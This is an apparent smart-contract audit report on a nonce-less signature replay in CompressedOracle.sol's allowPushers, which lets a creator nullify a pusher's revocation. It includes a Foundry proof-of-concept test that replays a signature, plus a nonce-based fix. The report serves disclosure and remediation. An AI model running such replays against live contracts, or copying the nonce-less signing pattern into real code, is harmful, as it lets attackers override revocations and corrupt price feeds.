### Title
`revokePusher()` is permanently bypassable via nonce-less signature replay in `allowPushers` — (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

---

### Summary

`allowPushers` verifies an EIP-191 signature from each pusher but includes **no nonce or per-signature invalidation**. After a pusher calls `revokePusher()`, the creator can replay the original signature (within the deadline window) to silently re-establish the delegation, making `revokePusher()` permanently ineffective for any signature whose deadline has not yet expired.

---

### Finding Description

`allowPushers` at line 192 constructs and verifies the following signed digest:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The signed message contains **no nonce**. The only time-bounding mechanism is the `deadline` field, which is checked via `_ensureDeadline(deadline)` (`block.timestamp <= deadline`). [2](#0-1) 

`revokePusher()` simply zeroes the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

Because the signature is stateless (no nonce, no used-signature registry), the creator can call `allowPushers` again with the **identical** `deadline`, `pusher`, and `signature` arguments. The deadline check still passes, the ECDSA recovery still succeeds, and `namespaceRemapping[pusher]` is written back to the creator's address — silently overriding the revocation.

The code comment at lines 188–191 explicitly acknowledges the replay concern and claims the deadline is the mitigation:

> *"the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [4](#0-3) 

However, the deadline only **limits the replay window** — it does not prevent replay within that window. A pusher who signs with a deadline of weeks or months (operationally common) gives the creator an extended window to nullify every revocation attempt.

---

### Impact Explanation

A pusher who has revoked their delegation cannot push to their own namespace while the creator holds a valid (non-expired) signature. The creator can call `allowPushers` with the same signature after every `revokePusher()` call, permanently trapping the pusher's pushes in the creator's namespace.

This forces the pusher into one of two outcomes:

1. **Stop pushing entirely** — the pusher's own pools (keyed to their own namespace via `feedIdOf(pusher, ...)`) receive no new price updates, producing timestamp-zero / stale reads that every consumer rejects as stale, causing bad-price execution or swap reverts in those pools.
2. **Continue pushing against their will** — the pusher's data feeds the creator's namespace, which the pusher may have revoked precisely because the creator is acting adversarially (e.g., the creator's pools are misconfigured or the pusher discovered a conflict of interest).

The `namespaceRemapping` mechanism is the sole routing gate for all push paths (both the `fallback()` bulk-push and `updateBySignature`). Breaking it breaks the oracle's namespace isolation invariant. [5](#0-4) 

---

### Likelihood Explanation

**Medium.** The creator must have retained the original signature — trivially available from on-chain calldata history. The deadline must not have expired. Pushers commonly sign with long deadlines (weeks to months) for operational convenience, giving the creator a large replay window. No special privileges or mempool access are required; the creator simply re-submits the same calldata.

---

### Recommendation

Add a per-pusher nonce to the signed digest and increment it on each successful `allowPushers` call:

```solidity
mapping(address => uint256) public pusherNonce;

// Inside allowPushers loop:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender, pusherNonce[pusher]++
    ))
);
```

Alternatively, maintain a `mapping(bytes32 => bool) usedSignatures` keyed by the signature hash and revert if the hash has already been consumed. Either approach ensures that a revoked pusher's old signature cannot be replayed.

---

### Proof of Concept

```solidity
function testRevokePusherBypass() public {
    uint256 privateKey = 0xABCD;
    address pusher    = vm.addr(privateKey);
    address creator   = address(0x1234);
    uint256 deadline  = block.timestamp + 365 days;

    // 1. Pusher signs delegation consent
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hash);
    bytes memory sig = abi.encodePacked(r, s, v);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // 3. Pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // 4. Creator replays the IDENTICAL signature — revocation is nullified
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);

    // Delegation is re-established; revokePusher() had no lasting effect
    assertEq(oracle.namespaceRemapping(pusher), creator);
}
```

The pusher's `revokePusher()` call is silently overridden. Any subsequent pushes by the pusher are routed to the creator's namespace via the `fallback()` path, and the pusher's own pools receive no updates. [6](#0-5) [2](#0-1)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-212)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L236-243)
```text
    /// @notice Allows a pusher to self-revoke their delegation. After revocation the
    ///         wallet pushes into its OWN namespace again (the registrationless default).
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-316)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
